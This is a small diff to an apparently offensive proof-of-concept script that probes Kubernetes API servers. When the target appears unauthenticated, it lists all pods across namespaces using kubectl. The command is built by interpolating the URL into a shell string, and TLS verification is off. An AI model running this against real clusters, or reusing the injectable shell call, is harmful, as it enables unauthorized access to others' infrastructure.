@@ -27,7 +27,7 @@ def poc(url):
         url = url.replace('http:', 'https:')
     try:
         g = requests.get(url, headers={'User-Agent': firefox()}, timeout=3, verify=False)
-        if g.status_code is 200 and 'healthz' in g.content and 'metrics' in g.content:
+        if g.status_code is 200 and 'healthz' in g.text and 'metrics' in g.text:
             pods = subprocess.Popen("kubectl -s %s get pods --all-namespaces=true -o=wide" % url,
                                     stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=open("/dev/null", "w"), shell=True)
             output = pods.communicate()[0].decode("utf-8")
